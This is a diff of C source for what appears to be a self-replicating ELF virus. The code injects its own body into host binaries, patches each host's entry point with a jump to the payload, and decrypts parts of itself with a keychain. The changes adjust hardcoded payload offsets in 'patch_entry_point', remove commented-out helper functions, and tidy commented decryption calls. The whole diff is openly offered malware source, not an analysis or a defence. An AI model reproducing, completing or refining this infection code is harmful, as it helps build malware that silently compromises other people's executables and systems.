@@ -23,40 +23,14 @@ __attribute__((always_inline)) static inline void replicate_on_memory(const stru
 	_memcpy(ptr + host->note->self->p_offset, __entry, host->note->self->p_filesz);
 }
 
-//__attribute__((always_inline)) static inline size_t get_offset(const struct s_host *host, char *ptr)
-//{
-//	char *tmp = ptr + host->note->self->p_offset + ((void *)execution - (void *)__entry);
-//	unsigned short instruction = 0;
-//
-//	while (true)
-//	{
-//		instruction = *(unsigned short *)tmp;
-//		if (instruction == 0xc748)
-//			break;
-//		tmp++;
-//	}
-//
-//	return (void *)(ptr + host->note->self->p_offset + host->note->self->p_filesz) - (void *)tmp;
-//}
-//
-//__attribute__((always_inline)) static inline void  patch_entry_point(const struct s_host *host, char *ptr, const size_t offset)
-//{
-//	(void)offset;
-//	char jmp[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
-//	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (host->note->self->p_filesz - (offset - 1073));
-//
-//	_memcpy(jmp + 1, &entry_point, sizeof(int));
-//	_memcpy(ptr + host->note->self->p_offset + (host->note->self->p_filesz - 1078), jmp, JMP_SIZE);
-//}
-
 __attribute__((always_inline)) static inline void patch_entry_point(const struct s_host *host, char *ptr)
 {
 	char jmp[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
-	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (host->note->self->p_filesz - 1073);
+	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (host->note->self->p_filesz - 1286);
 
 	_memcpy(ptr + host->note->self->p_offset, __entry, host->note->self->p_filesz);
 	_memcpy(jmp + 1, &entry_point, sizeof(int));
-	_memcpy(ptr + host->note->self->p_offset + (host->note->self->p_filesz - 1078), jmp, sizeof(jmp));
+	_memcpy(ptr + host->note->self->p_offset + (host->note->self->p_filesz - 1291), jmp, sizeof(jmp));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -65,7 +39,7 @@ __attribute__((always_inline)) static inline void patch_entry_point(const struct
 
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-	//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
 #if DEBUG
 	char function[] = "injection:\t\t";
@@ -88,7 +62,7 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		goto label;
 
 	char *ptr;
-	int fd = 0;
+	int fd;
 
 	const size_t filesize = host->note->self->p_offset + host->note->self->p_filesz;
 
@@ -116,8 +90,8 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 
 label:
 	(void)keychain;
-	//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
-	//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
+//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
+//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
 	autodestruction(host, keychain, context);
 }
